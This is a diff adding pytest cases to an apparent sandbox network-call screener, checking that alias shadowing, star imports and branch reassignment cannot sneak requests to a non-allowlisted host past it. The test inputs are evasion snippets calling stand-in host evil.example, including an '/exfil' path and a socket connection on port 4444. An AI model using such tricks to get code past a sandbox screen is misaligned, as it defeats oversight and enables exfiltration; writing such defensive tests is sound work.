@@ -268,6 +268,205 @@ class TestUnreadableNetworkHost:
         _ok(code)
 
 
+class TestRebindingDropsStaleAliases:
+    """An alias stops naming its module the moment the name is bound to something else. Keeping the
+    stale entry rewrote `requests.get` to `socket.get`, which matches no network prefix, so shadowing
+    an alias with the real import was enough to walk a hardcoded host past the screen."""
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            pytest.param(
+                'import socket as requests\nimport requests\nrequests.get("https://evil.example/x")',
+                id = "plain_import_shadows_alias",
+            ),
+            pytest.param(
+                "import socket as u\n"
+                "import urllib.request as u\n"
+                'u.urlopen("https://evil.example/x")',
+                id = "second_alias_replaces_first",
+            ),
+            pytest.param(
+                "import socket as requests\n"
+                "import requests as _r\n"
+                "requests = _r\n"
+                'requests.get("https://evil.example/x")',
+                id = "assignment_shadows_alias",
+            ),
+            pytest.param(
+                'import requests as r\ns = r\ns.get("https://evil.example/x")',
+                id = "assignment_carries_the_module_on",
+            ),
+        ],
+    )
+    def test_shadowed_alias_still_blocked(self, code):
+        _blocked(code, expect_phrase = "Blocked: host not in sandbox allowlist")
+
+    def test_shadowed_alias_still_fails_closed_on_a_dynamic_host(self):
+        _blocked(
+            "import socket as requests\nimport requests\nrequests.get('https://' + h)",
+            expect_phrase = "Blocked: network destination is not a literal",
+        )
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            pytest.param(
+                "import socket as requests\n"
+                "import requests\n"
+                'requests.get("https://huggingface.co/unsloth")',
+                id = "shadowed_alias_trusted_host_allowed",
+            ),
+            # A locally defined `get` is not `requests.get`, so the allowlist does not apply to it.
+            pytest.param(
+                "from requests import get\n"
+                "def get(u):\n"
+                "    return u\n"
+                'get("https://evil.example/x")',
+                id = "local_def_shadows_imported_function",
+            ),
+        ],
+    )
+    def test_legitimate_rebinding_allowed(self, code):
+        _ok(code)
+
+
+class TestStarImportedNetworkFunctions:
+    """A star import binds the same bare callee an explicit `from X import f` does, under no name
+    the screen can enumerate, so the callee is resolved against the star-imported modules. Without
+    that, writing `*` where the function name would go was enough to skip the screen entirely."""
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            pytest.param(
+                'from requests import *\nget("http://evil.example/exfil")',
+                id = "star_requests_get_blocked",
+            ),
+            pytest.param(
+                'from socket import *\ncreate_connection(("evil.example", 4444))',
+                id = "star_socket_create_connection_blocked",
+            ),
+            pytest.param(
+                'from urllib.request import *\nurlopen("http://evil.example/x")',
+                id = "star_urlopen_blocked",
+            ),
+        ],
+    )
+    def test_star_imported_call_blocked(self, code):
+        _blocked(code, expect_phrase = "Blocked: host not in sandbox allowlist")
+
+    def test_star_imported_call_fails_closed_on_a_dynamic_host(self):
+        _blocked(
+            'from requests import *\nget("http://" + h)',
+            expect_phrase = "Blocked: network destination is not a literal",
+        )
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            pytest.param(
+                'from requests import *\nget("https://huggingface.co/unsloth")',
+                id = "star_import_trusted_host_allowed",
+            ),
+            pytest.param(
+                'from os import *\nget("http://evil.example/x")',
+                id = "star_import_of_a_non_network_module_ignored",
+            ),
+            pytest.param(
+                'from requests import *\ndef get(u):\n    return u\nget("http://evil.example/x")',
+                id = "local_def_shadows_the_star_import",
+            ),
+            pytest.param(
+                "from requests import *\ns = Session()", id = "star_imported_session_ctor_allowed"
+            ),
+        ],
+    )
+    def test_star_import_does_not_overblock(self, code):
+        _ok(code)
+
+
+class TestNameHoldingSeveralValues:
+    """A name is checked against every literal it can hold. Reading only the newest binding would
+    let `if f: url = evil` / `else: url = allowed` / `get(url)` through on the allowed spelling,
+    while collapsing any reassignment to unreadable refused two allowlisted endpoints in a row."""
+
+    def test_two_allowlisted_literals_in_sequence_allowed(self):
+        _ok(
+            "import requests\n"
+            'url = "https://huggingface.co/api/models"\n'
+            "requests.get(url)\n"
+            'url = "https://huggingface.co/api/datasets"\n'
+            "requests.get(url)\n"
+        )
+
+    def test_conditional_reassignment_to_another_allowlisted_host_allowed(self):
+        _ok(
+            "import requests\n"
+            'url = "https://huggingface.co/a"\n'
+            "if flag:\n"
+            '    url = "https://docs.python.org/3/"\n'
+            "requests.get(url)\n"
+        )
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            pytest.param(
+                "import requests\n"
+                "if flag:\n"
+                '    url = "https://evil.example/x"\n'
+                "else:\n"
+                '    url = "https://huggingface.co/a"\n'
+                "requests.get(url)\n",
+                id = "untrusted_branch_first",
+            ),
+            pytest.param(
+                "import requests\n"
+                "if flag:\n"
+                '    url = "https://huggingface.co/a"\n'
+                "else:\n"
+                '    url = "https://evil.example/x"\n'
+                "requests.get(url)\n",
+                id = "untrusted_branch_second",
+            ),
+        ],
+    )
+    def test_any_untrusted_value_blocks(self, code):
+        _blocked(code, expect_phrase = "Blocked: host not in sandbox allowlist")
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            # The call is read before the assignment, but the loop runs the assignment first on
+            # every iteration after the initial one.
+            pytest.param(
+                "import requests\n"
+                'url = "https://huggingface.co/a"\n'
+                "for h in hosts:\n"
+                "    requests.get(url)\n"
+                '    url = "https://" + h\n',
+                id = "value_rebound_later_in_a_loop",
+            ),
+            pytest.param(
+                "import requests\n"
+                'url, other = "https://huggingface.co/a", "x"\n'
+                "requests.get(url)\n",
+                id = "tuple_unpacking_is_not_a_readable_value",
+            ),
+            pytest.param(
+                "import requests\n"
+                'url = "https://huggingface.co/a"\n'
+                "def fetch(url):\n"
+                "    return requests.get(url)\n",
+                id = "parameter_shadows_the_literal",
+            ),
+        ],
+    )
+    def test_unreadable_value_fails_closed(self, code):
+        _blocked(code, expect_phrase = "Blocked: network destination is not a literal")
+
+
 class TestHostNormalization:
     def test_trailing_dot_treated_same(self):
         _ok('import requests; requests.get("https://wikipedia.org./")')
